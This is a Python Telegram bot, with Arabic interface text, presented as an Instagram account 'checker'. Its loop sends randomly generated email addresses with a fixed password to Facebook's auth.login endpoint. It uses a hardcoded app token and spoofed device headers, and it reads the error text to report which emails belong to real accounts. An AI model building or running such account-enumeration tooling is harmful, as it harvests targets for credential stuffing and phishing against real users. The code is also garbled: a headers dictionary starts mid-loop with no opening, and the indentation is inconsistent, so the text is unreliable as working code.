import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from InstagramIG import *
import json
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


@bot.message_handler(commands=['start'])
def boten(message):
	
    
    
    mas = types.InlineKeyboardMarkup(row_width=2)
    
    A = types.InlineKeyboardButton(text ="CHECKER (IRAN)", callback_data="F1")
    
    M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
    
    mas.add(A,M)
    
    bot.send_message(message.chat.id, f"- أهلاً بكً  !\n\n- بوت تشكير حسابات انستا غرام 🧑‍💻\n\n♻️ لوحة التحكم الخاصه بك ♨️",reply_markup=mas)
    
    
@bot.callback_query_handler(func=lambda call: True)
def masg(call):
	
	
	global nam
	
	if call.data =="MohammedNajih":
		
		mas = types.InlineKeyboardMarkup(row_width=2)
		
		A = types.InlineKeyboardButton(text ="CHECKER (IRAN)", callback_data="F1")
		
		M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
		
		M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
		
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="- أهلاً بكً عزيزي المستخدم \n\n- بوت تشكير حسابات انستا غرام 🧑‍💻\n\n♻️ لوحة التحكم الخاصه بك ♨️",reply_markup=mas)

	elif call.data =="F1":
		xb = "0987654321"
		xm = "asdfghjklpoiuytrewqmnbvcxz"
		xl = ['@gmail.com', '@yahoo.com', '@mail.ru','@hotmail.com','@outlock.com']
		ok=0
		cp=0
		sk=0
		while True:
			num = str(''.join(random.choice(xb)for i in range(3)))
			bs = str(''.join(random.choice(xm)for i in range(6))) 
			bl = str(''.join(random.choice(xl)for i in range(1)))
			email = str(bs)+str(num)+str(bl)
            'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 
            'x-fb-sim-hni': str(random.randint(20000, 40000)), 
            'x-fb-net-hni': str(random.randint(20000, 40000)), 
            'x-fb-connection-quality': 'EXCELLENT', 
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
            'user-agent': user_agent, 
            'content-type': 'application/x-www-form-urlencoded', 
            'x-fb-http-engine': 'Liger'}
			params = {
            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
            'format': 'JSON', 
            'sdk_version': '2', 
            'email': email, 
            'locale': 'en_US', 
            'password': '@SidraTools', 
            'sdk': 'ios', 
            'generate_session_cookies': '1', 
            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			api = 'https://b-api.facebook.com/method/auth.login'
			response = requests.get(api, params=params, headers=headers)
			if 'The password you entered is incorrect. Please try again' in str(response.text):
				ok+=1
				sk+=1
				bot.send_message(call.message.chat.id,f"‹ ⌯ Facebook Account ✓⌯ \n. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .\n⌯ Email : {email} \n. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .\n⌯ @t_4gi")
			else:
				cp+=1
				sk+=1
				mas = types.InlineKeyboardMarkup(row_width=2)
				A = types.InlineKeyboardButton(f'GOOD : {ok}',callback_data="1x")
				E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
				B = types.InlineKeyboardButton(f'{email}', callback_data="1x")
				R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
				M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
				mas.add(A,E,B,R,M)
				bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://ponss.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
